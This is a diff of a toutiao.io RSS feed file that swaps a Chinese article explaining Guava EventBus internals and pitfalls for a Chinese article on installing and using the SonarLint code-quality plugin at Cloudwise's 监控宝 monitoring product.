@@ -5,686 +5,335 @@
             <link>http://toutiao.io/</link>
             <description></description>
 <item>
-<guid>102dade5263cb75c6e930abe43ce013d</guid>
-<title>一文读懂 Guava EventBus（订阅\发布事件）</title>
-<link>https://toutiao.io/k/pgpwokb</link>
-<content:encoded>&lt;div&gt;&lt;div&gt;&lt;div class=&quot;preview&quot;&gt;&lt;h4&gt;作者：京东科技 刘子洋&lt;/h4&gt;
+<guid>08eaeb3aba0caa4db81bc3d0be7ef45d</guid>
+<title>代码质量管理平台 SonarLint 在监控宝中的实践总结</title>
+<link>https://toutiao.io/k/39hakmk</link>
+<content:encoded>&lt;div&gt;&lt;div&gt;&lt;div class=&quot;container app-preview post-body&quot;&gt;
+  &lt;div class=&quot;preview&quot;&gt;&lt;p&gt;作者：云智慧开发工程师 Kori Zhang。&lt;/p&gt;
 
-&lt;h1&gt;背景&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://www.cloudwise.com/cn/page/synmonitoring.html&quot;&gt;点击直达监控宝官网&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
 
-&lt;p&gt;最近项目出现同一消息发送多次的现象，对下游业务方造成困扰，经过排查发现使用EventBus方式不正确。也借此机会学习了下EventBus并进行分享。以下为分享内容，本文主要分为五个部分，篇幅较长，望大家耐心阅读。&lt;/p&gt;
+&lt;p&gt;监控宝作为云智慧推出的新一代用户体验监控工具，向用户提供了 IT 性能监控（IT Performance Monitoring）的 SaaS 产品服务。Sonar（代码质量管理平台）是一个开源平台，用于管理源代码的质量。从 Sonar 1.6 版本开始，Sonar 从一个质量数据报告工具，转变成为代码质量管理平台。本文将通过介绍免费开源 IDE 扩展 SonarLint 的使用方法，总结 SonarLint 在监控宝中的落地实践效果。&lt;/p&gt;
 
-&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;1、简述：简单介绍EventBus及其组成部分。&lt;/p&gt;&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;2、原理解析：主要对listener注册流程及Event发布流程进行解析。&lt;/p&gt;&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;3、使用指导：EventBus简单的使用指导。&lt;/p&gt;&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;4、注意事项：在使用EventBus中需要注意的一些隐藏逻辑。&lt;/p&gt;&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;5、分享时提问的问题&lt;/p&gt;&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;6、项目中遇到的问题：上述问题进行详细描述并复现场景。&lt;/p&gt;&lt;/li&gt;
-&lt;/ul&gt;
+&lt;h2&gt;SonarLint 是什么&lt;/h2&gt;
 
-&lt;h1&gt;1、简述&lt;/h1&gt;
+&lt;p&gt;SonarLint 是一个免费的开源 IDE 扩展,可在您编写代码时查找和修复错误、漏洞和代码质量问题。&lt;/p&gt;
 
-&lt;h2&gt;1.1、概念&lt;/h2&gt;
+&lt;h3&gt;SonarLint 作用&lt;/h3&gt;
 
-&lt;p&gt;下文摘自EventBus源码注释，从注释中可以直观了解到他的&lt;strong&gt;功能、特性、注意事项&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;SonarLint 发现的问题后，会根据问题类型给出推荐的的范例代码协助开发人员找到合适的修改思路。&lt;/p&gt;
 
-&lt;p&gt;【源码注释】&lt;/p&gt;
+&lt;h3&gt;SonarLint 安装使用&lt;/h3&gt;
 
-&lt;blockquote&gt;
-&lt;p&gt;Dispatches events to listeners, and provides ways for listeners to register themselves.&lt;/p&gt;
-
-&lt;p&gt;The EventBus allows publish-subscribe-style communication between components without requiring the components to explicitly register with one another (and thus be aware of each other). It is designed exclusively to replace traditional Java in-process event distribution using explicit registration. It is not a general-purpose publish-subscribe system, nor is it intended for interprocess communication.&lt;/p&gt;
-
-&lt;p&gt;Receiving Events&lt;/p&gt;
-
-&lt;p&gt;To receive events, an object should:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;Expose a public method, known as the event subscriber, which accepts a single argument of the type of event desired;&lt;/p&gt;&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;Mark it with a Subscribe annotation;&lt;/p&gt;&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;Pass itself to an EventBus instance&#x27;s register(Object) method.&lt;/p&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Posting Events&lt;/p&gt;
-
-&lt;p&gt;To post an event, simply provide the event object to the post(Object) method. The EventBus instance will determine the type of event and route it to all registered listeners.&lt;/p&gt;
-
-&lt;p&gt;Events are routed based on their type — an event will be delivered to any subscriber for any type to which the event is assignable. This includes implemented interfaces, all superclasses, and all interfaces implemented by superclasses.&lt;/p&gt;
-
-&lt;p&gt;When post is called, all registered subscribers for an event are run in sequence, so subscribers should be reasonably quick. If an event may trigger an extended process (such as a database load), spawn a thread or queue it for later. (For a convenient way to do this, use an AsyncEventBus.)&lt;/p&gt;
-
-&lt;p&gt;Subscriber Methods&lt;/p&gt;
-
-&lt;p&gt;Event subscriber methods must accept only one argument: the event.&lt;/p&gt;
-
-&lt;p&gt;Subscribers should not, in general, throw. If they do, the EventBus will catch and log the exception. This is rarely the right solution for error handling and should not be relied upon; it is intended solely to help find problems during development.&lt;/p&gt;
-
-&lt;p&gt;The EventBus guarantees that it will not call a subscriber method from multiple threads simultaneously, unless the method explicitly allows it by bearing the AllowConcurrentEvents annotation. If this annotation is not present, subscriber methods need not worry about being reentrant, unless also called from outside the EventBus.&lt;/p&gt;
-
-&lt;p&gt;Dead Events&lt;/p&gt;
-
-&lt;p&gt;If an event is posted, but no registered subscribers can accept it, it is considered &quot;dead.&quot; To give the system a second chance to handle dead events, they are wrapped in an instance of DeadEvent and reposted.&lt;/p&gt;
-
-&lt;p&gt;If a subscriber for a supertype of all events (such as Object) is registered, no event will ever be considered dead, and no DeadEvents will be generated. Accordingly, while DeadEvent extends Object, a subscriber registered to receive any Object will never receive a DeadEvent.&lt;/p&gt;
-
-&lt;p&gt;This class is safe for concurrent use.&lt;/p&gt;
-
-&lt;p&gt;See the Guava User Guide article on EventBus.&lt;br/&gt;
-Since:&lt;br/&gt;
-10.0&lt;br/&gt;
-Author:&lt;br/&gt;
-Cliff Biffle&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h2&gt;1.2、系统流程&lt;/h2&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-34hhFYGHy2tAeI3jh.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
-
-&lt;h2&gt;1.3、组成部分&lt;/h2&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-35CNd87spqws8i8Xi.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
-
-&lt;h3&gt;1.3.1、调度器&lt;/h3&gt;
-
-&lt;p&gt;EventBus、AsyncEventBus都是一个调度的角色，区别是一个同步一个异步。&lt;/p&gt;
-
-
-
-&lt;pre&gt;&lt;code&gt;源码注释：
-&amp;gt; Dispatches events to listeners, and provides ways for listeners to register themselves.
-
-意思是说EventBus分发事件（Event）给listeners处理，并且提供listeners注册自己的方法。从这里我们可以看出EventBus主要是一个调度的角色。
-
-**EventBus总结**
-- 1.同步执行，事件发送方在发出事件之后，会等待所有的事件消费方执行完毕后，才会回来继续执行自己后面的代码。
-- 2.事件发送方和事件消费方会在同一个线程中执行，消费方的执行线程取决于发送方。
-- 3.同一个事件的多个订阅者，在接收到事件的顺序上面有不同。谁先注册到EventBus的，谁先执行，如果是在同一个类中的两个订阅者一起被注册到EventBus的情况，收到事件的顺序跟方法名有关。
-
-
-&lt;/code&gt;&lt;/pre&gt;
-
-
-
-&lt;pre&gt;&lt;code&gt;源码注释：
-&amp;gt; An {@link EventBus} that takes the Executor of your choice and uses it to dispatch events, allowing dispatch to occur asynchronously.
-
-意思是说AsyncEventBus就是EventBus，只不过AsyncEventBus使用你指定的线程池（不指定使用默认线程池）去分发事件（Event），并且是异步进行的。
-
-**AsyncEventBus总结**
-- 1.异步执行，事件发送方异步发出事件，不会等待事件消费方是否收到，直接执行自己后面的代码。
-- 2.在定义AsyncEventBus时，构造函数中会传入一个线程池。事件消费方收到异步事件时，消费方会从线程池中获取一个新的线程来执行自己的任务。
-- 3.同一个事件的多个订阅者，它们的注册顺序跟接收到事件的顺序上没有任何联系，都会同时收到事件，并且都是在新的线程中，**异步并发**的执行自己的任务。
-
-
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3&gt;1.3.2、事件承载器&lt;/h3&gt;
-
-
-
-&lt;pre&gt;&lt;code&gt;事件主体，用于承载消息。
-
-
-&lt;/code&gt;&lt;/pre&gt;
-
-
-
-&lt;pre&gt;&lt;code&gt; 源码注释：
-&amp;gt;Wraps an event that was posted, but which had no subscribers and thus could not be delivered, Registering a DeadEvent subscriber is useful for debugging or logging, as it can detect misconfigurations in a system&#x27;s event distribution.
-
-意思是说DeadEvent就是一个被包装的event，只不过是一个没有订阅者无法被分发的event。我们可以在开发时注册一个DeadEvent，因为它可以检测系统事件分布中的错误配置。
-
-
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3&gt;1.3.3、事件注册中心&lt;/h3&gt;
-
-&lt;p&gt;SubscriberRegistry&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt; 源码注释：
-&amp;gt;  Registry of subscribers to a single event bus.
-意思是说SubscriberRegistry是单个事件总线（EventBus）的订阅者注册表。
-
-
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3&gt;1.3.4、事件分发器&lt;/h3&gt;
-
-&lt;p&gt;Dispatcher&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;源码注释：
-&amp;gt;Handler for dispatching events to subscribers, providing different event ordering guarantees that make sense for different situations.
-
-&amp;gt;Note: The dispatcher is orthogonal to the subscriber&#x27;s Executor. The dispatcher controls the order in which events are dispatched, while the executor controls how (i.e. on which thread) the subscriber is actually called when an event is dispatched to it.
-
-意思是说Dispatcher主要任务是将事件分发到订阅者，并且可以不同的情况，按不同的顺序分发。
-
-
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Dispatcher有三个子类，用以满足不同的分发情况&lt;/p&gt;
-
-&lt;p&gt;1.PerThreadQueuedDispatcher&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;源码注释：
-&amp;gt; Returns a dispatcher that queues events that are posted reentrantly on a thread that is already dispatching an event, guaranteeing that all events posted on a single thread are dispatched to all subscribers in the order they are posted.
-
-&amp;gt; When all subscribers are dispatched to using a direct executor (which dispatches on the same thread that posts the event), this yields a breadth-first dispatch order on each thread. That is, all subscribers to a single event A will be called before any subscribers to any events B and C that are posted to the event bus by the subscribers to A.
-
-意思是说一个线程在处理事件过程中又发布了一个事件，PerThreadQueuedDispatcher会将后面这个事件放到最后，从而保证在单个线程上发布的所有事件都按其发布顺序分发给订阅者。**注意，每个线程都要自己存储事件的队列。**
-
-第二段是说PerThreadQueuedDispatcher按**广度优先**分发事件。并给了一个例子：
-代码中发布了事件A，订阅者收到后，在执行过程中又发布了事件B和事件C，PerThreadQueuedDispatcher会确保事件A分发给所有订阅者后，再分发B、C事件。
-
-
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;2.LegacyAsyncDispatcher&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;源码注释：
-&amp;gt; Returns a dispatcher that queues events that are posted in a single global queue. This behavior matches the original behavior of AsyncEventBus exactly, but is otherwise not especially useful. For async dispatch, an immediate dispatcher should generally be preferable.
-
-意思是说LegacyAsyncDispatcher有一个全局队列用于存放所有事件，LegacyAsyncDispatcher特性与AsyncEventBus特性完全相符，除此之外没有其他什么特性。如果异步分发的话，最好用immediate dispatcher。
-
-
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;3.ImmediateDispatcher&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;源码注释：
-&amp;gt; Returns a dispatcher that dispatches events to subscribers immediately as they&#x27;re posted without using an intermediate queue to change the dispatch order. This is effectively a depth-first dispatch order, vs. breadth-first when using a queue.
-
-意思是说ImmediateDispatcher在发布事件时立即将事件分发给订阅者，而不使用中间队列更改分发顺序。这实际上是**深度优先**的调度顺序，而不是使用队列时的**广度优先**。
-
-
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3&gt;1.3.4、订阅者&lt;/h3&gt;
-
-
-
-&lt;pre&gt;&lt;code&gt;源码注释：
-&amp;gt; A subscriber method on a specific object, plus the executor that should be used for dispatching events to it.
-
-Two subscribers are equivalent when they refer to the same method on the same object (not class). This property is used to ensure that no subscriber method is registered more than once.
-
-第一段意思是说，Subscriber是特定对象（Event）的订阅方法，用于执行被分发事件。第二段说当两个订阅者在同一对象 **（不是类）** 上引用相同的方法时，它们是等效的，此属性用于确保不会多次注册任何订阅者方法，主要说明会对订阅者进行判重，如果是同一个对象的同一个方法，则认为是同一个订阅者，不会进行重复注册。
-
-
-&lt;/code&gt;&lt;/pre&gt;
-
-
-
-&lt;pre&gt;&lt;code&gt;源码注释：
-&amp;gt; Subscriber that synchronizes invocations of a method to ensure that only one thread may enter the method at a time.
-
-意思是说同步方法调用以确保一次只有一个线程可以执行订阅者方法（线程安全）。
-
-
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h1&gt;2、原理解析&lt;/h1&gt;
-
-&lt;h2&gt;2.1、主体流程&lt;/h2&gt;
+&lt;p&gt;SonarLint 目前支持多种 IDE 的插件安装，我使用的是 idea 所以这里介绍在 idea 中的安装方式其它的可以查看官网 sonar。&lt;/p&gt;
 
 &lt;ol&gt;
-&lt;li&gt;&lt;p&gt;listener 通过EventBus进行注册。&lt;/p&gt;&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;SubscriberRegister 会根据listener、listener中含有【@Subscribe】注解的方法及各方法参数创建Subscriber 对象，并将其维护在Subscribers（ConcurrentMap类型，key为event类对象，value为subscriber集合）中。&lt;/p&gt;&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;publisher发布事件Event。&lt;/p&gt;&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;发布Event后，EventBus会从SubscriberRegister中查找出所有订阅此事件的Subscriber，然后让Dispatcher分发Event到每一个Subscriber。&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt; 选择file→settings→plugins→输入sonarlint。&lt;/li&gt;
 &lt;/ol&gt;
 
-&lt;p&gt;流程如下：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-35ZoCIOMPMZ3XFjO35.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
-
-&lt;h2&gt;2.2、listener注册原理&lt;/h2&gt;
-
-&lt;h3&gt;2.2.1、listener注册流程&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/27c89aff01ef4e06a91a327ef77650c6%7Etplv-k3u1fbpfcp-zoom-1.image&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
 
 &lt;ol&gt;
-&lt;li&gt;&lt;p&gt;缓存所有含有@Subscribe注解方法到subscriberMethodsCache（LoadingCache&lt;class&gt;, ImmutableList&amp;gt;， key为listener，value为method集合）。&lt;/class&gt;&lt;/p&gt;&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;listener注册。&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt; 下图显示为已安装过的界面，所以界面为 uninstall，如果没安装显示的则是 install，安装完重启之后就可以使用。&lt;/li&gt;
 &lt;/ol&gt;
 
-&lt;p&gt;&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-35vFAQZ28dWGeyCzk.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e12ce8dd6a1f4bb5ac2f2df0bb59a7cc%7Etplv-k3u1fbpfcp-zoom-1.image&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
 
-&lt;h3&gt;2.2.2、原理分析&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt; 右键项目进行如下操作：&lt;/li&gt;
+&lt;/ol&gt;
 
-&lt;ul&gt;
-&lt;li&gt;  获取含有@Subscribe注释的方法进行缓存&lt;br/&gt;
-找到所有被【@Subscribe】修饰的方法，并进行缓存&lt;br/&gt;
-&lt;strong&gt;注意！！！这两个方法被static修饰，类加载的时候就进行寻找&lt;/strong&gt;&lt;br/&gt;
-&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-363632jcSA363HmIqDrO.png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;
-&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-36qD8hcLnttDbTKkH.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/li&gt;
-&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&quot;https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d221cef8085a4630b125a79f73e34740%7Etplv-k3u1fbpfcp-zoom-1.image&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
 
-&lt;p&gt;订阅者唯一标识是【方法名+入参】&lt;br/&gt;
-&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-36sYr36D8wm728xLok.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt; 执行之后可以看到如下信息，如果代码中有不合理的地方会在 report 中显示。&lt;/li&gt;
+&lt;/ol&gt;
 
-&lt;ul&gt;
-&lt;li&gt;  注册订阅者&lt;br/&gt;
-1.注册方法&lt;br/&gt;
-&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-37CKeAug118jTsL3HR.png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;
-创建Subscriber时，如果method含有【@AllowConcurrentEvents】注释，则创建SynchronizedSubscriber，否则创建Subscriber&lt;br/&gt;
-&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-37FTLB9ojhgA6ajJ37.png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;
-2、获取所有订阅者&lt;br/&gt;
-&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-37BNnJadaGDajnlv7.png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;
-3、从缓存中获取所有订阅方法&lt;br/&gt;
-&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-37uJjWQomNFoAXoOc.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/li&gt;
-&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&quot;https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c550713762174689bc76d6b5667a1963%7Etplv-k3u1fbpfcp-zoom-1.image&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
 
-&lt;h2&gt;2.3、Event发布原理&lt;/h2&gt;
+&lt;p&gt;其他设置请参考: &lt;a href=&quot;https://blog.csdn.net/baixf/article/details/88534198&quot;&gt;https://blog.csdn.net/baixf/article/details/88534198&lt;/a&gt;&lt;/p&gt;
 
-&lt;h3&gt;2.3.1、发布主体流程&lt;/h3&gt;
+&lt;h3&gt;监控宝中 SonarLint 实践效果&lt;/h3&gt;
+
+&lt;p&gt;SonarLint 已在监控宝 jkbFileServer、Alertd 重构、jkbApiServer 重构中运用，实践效果如下：&lt;/p&gt;
 
 &lt;ul&gt;
-&lt;li&gt;&lt;p&gt;publisher 发布事件Event。&lt;/p&gt;&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;EventBus 根据Event 类对象从SubscriberRegistry中获取所有订阅者。&lt;/p&gt;&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;将Event 和 eventSubscribers 交由Dispatcher去分发。&lt;/p&gt;&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;Dispatcher 将Event 分发给每个Subscribers。&lt;/p&gt;&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;Subscriber 利用反射执行订阅者方法。&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;  SonarLint 的及时反馈，可以帮助我们在编写阶段就保持一定的代码质量进而提高编码能力；&lt;/li&gt;
+&lt;li&gt;  通过 Sonar 扫描后减少不必要返工；&lt;/li&gt;
+&lt;li&gt;  SonarLint 配合 IDE 使用方便；&lt;/li&gt;
+&lt;li&gt;  对于完美主义的程序员绝对是利器。&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;图中画出了三个Dispatcher的分发原理。&lt;br/&gt;
-&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-38gUVcxWJdDxgOepS.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
-
-&lt;h3&gt;2.3.2、原理分析&lt;/h3&gt;
-
-
-
-&lt;h1&gt;3、使用指导&lt;/h1&gt;
-
-&lt;h2&gt;3.1、主要流程&lt;/h2&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-44EIcwn73n2fAw9m3.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
-
-&lt;h2&gt;3.2、流程详解&lt;/h2&gt;
+&lt;h3&gt;Alibaba代码规范插件 vs SonarLint&lt;/h3&gt;
 
 &lt;ul&gt;
-&lt;li&gt;&lt;p&gt;1、创建EventBus、AsyncEventBus Bean&lt;br/&gt;
-在项目中统一配置全局单例Bean（如特殊需求，可配置多例）&lt;br/&gt;
-&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-44h0B7YvpUoluhSYt.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;2、定义EventMsg&lt;br/&gt;
-设置消息载体。&lt;br/&gt;
-&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-45WsFZ0rd456wCYQF8.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;3、注册Listener&lt;br/&gt;
-注册Listener，处理事件&lt;br/&gt;
-&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-45GWEuo09o7vFxTJ3.png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;
-&lt;strong&gt;注意! 在使用 PostConstruct注释进行注册时，需要注意子类会执行父类含有PostConstruct 注释的方法。&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;
-&lt;li&gt;&lt;p&gt;3、事件发布&lt;br/&gt;
-封装统一发布事件的Bean，然后通过Bean注入到需要发布的Bean里面进行事件发布。&lt;br/&gt;
-&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-45jydFrk8sCcCenv3.png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;
-&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-45j3wc7Z3l453cn9ai.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;  Alibaba 代码规范插件比较关心的是代码规范，编码风格上的，例如命名规范、注释、代码行数等；&lt;/li&gt;
+&lt;li&gt;  SonarLint 比较关心代码正确性，存在的问题、风险、漏洞等，例如重复代码、空指针、安全漏洞。&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;&lt;strong&gt;此处对EventBus进行了统一封装收口操作，主要考虑的是如果做一些操作，直接改这一处就可以。如果不需要封装，可以在使用的地方直接注入EventBus即可。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;总体来讲，Alibaba 代码规范插件与 SonarLint ****二者侧的重点不同。机器配置高的情况下建议二者配合使用，可提高工程整体的代码质量，并且能够在编码阶段规避风险，提高程序的健壮性。&lt;/p&gt;
 
-&lt;h1&gt;4、注意事项&lt;/h1&gt;
-
-&lt;h2&gt;4.1、循环分发事件&lt;/h2&gt;
-
-&lt;p&gt;如果业务流程较长，切记梳理好业务流程，不要让事件循环分发。&lt;br/&gt;
-目前EventBus没有对循环事件进行处理。&lt;/p&gt;
-
-&lt;h2&gt;4.2、使用 @PostConstrucrt 注册listener&lt;/h2&gt;
-
-&lt;p&gt;&lt;strong&gt;子类在执行实例化时，会执行父类@PostConstrucrt 注释&lt;/strong&gt;。 如果listenerSon继承listenerFather，当两者都使用@PostConstrucrt注册订阅方法时，子类也会调用父类的注册方法进行注册订阅方法。&lt;strong&gt;由于EventBus机制，子类注册订阅方法时，也会注册父类的监听方法&lt;/strong&gt;&lt;br/&gt;
-&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-46XM3CmgeO9xjpTfV.png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;
-Subscriber唯一标志是（listener+method），因此在对同一方法注册时，由于不是同一个listener，所以对于EventBus是两个订阅方法。&lt;br/&gt;
-&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-46f9JVHDmpmPprhGS.png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;
-&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-46FWvUbRg6r9U469og.png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;
-&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-47KJ2EDHX0zcNMVqW.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
-
-&lt;p&gt;因此，如果存在listenerSon、listenerFather两个listener，且listenerSon继承listenerFather。当都使用@PostConstrucrt注册时，会导致listenerFather里面的订阅方法注册两次。&lt;/p&gt;
-
-&lt;h2&gt;4.3、含有继承关系的listener&lt;/h2&gt;
-
-&lt;p&gt;当注册listener含有继承关系时，listener处理Event消息时，listener的父类也会处理该消息。&lt;/p&gt;
-
-&lt;h3&gt;4.3.1、继承关系的订阅者&lt;/h3&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-16-14F089qFJtgwn8Xud.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
-
-&lt;h3&gt;4.3.2、原理&lt;/h3&gt;
-
-&lt;p&gt;子类listener注册，父类listener也会注册&lt;br/&gt;
-&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-5050vdLEu23zk8GfrZ.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
-
-&lt;h2&gt;4.4、含有继承关系的Event&lt;/h2&gt;
-
-&lt;p&gt;如果作为参数的Event有继承关系，使用EventBus发布Event时，Event父类的监听者也会对Event进行处理。&lt;/p&gt;
-
-&lt;h3&gt;4.4.1、执行结果&lt;/h3&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-51WxPqOJjtAW93Nxz.png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;
-&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-51W7dZaJqQSckySbQ.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
-
-&lt;h3&gt;4.4.2、原理&lt;/h3&gt;
-
-&lt;p&gt;在分发消息的时候，会获取所有订阅者数据（Event订阅者和Event超类的订阅者），然后进行分发数据。&lt;br/&gt;
-获取订阅者数据如下图：&lt;br/&gt;
-&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-52iFTw6TT52nU9w52og.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-5252c6jhLokxQybOMG.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
-
-&lt;p&gt;缓存Event及其超类的类对象，key为Event类对象。&lt;br/&gt;
-&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-520xLNddrPzK3hnKd.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
-
-&lt;h1&gt;5、分享提问问题&lt;/h1&gt;
-
-&lt;h4&gt;问题1：PerThreadQueuedDispatcherd 里面的队列，是否是有界队列？&lt;/h4&gt;
-
-&lt;p&gt;有界队列，最大值为 int 的最大值 （2147483647），源码如下图：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-528QBIATdvsKU8cfm.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-52RnFOuRGdDIzkizF.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;
-
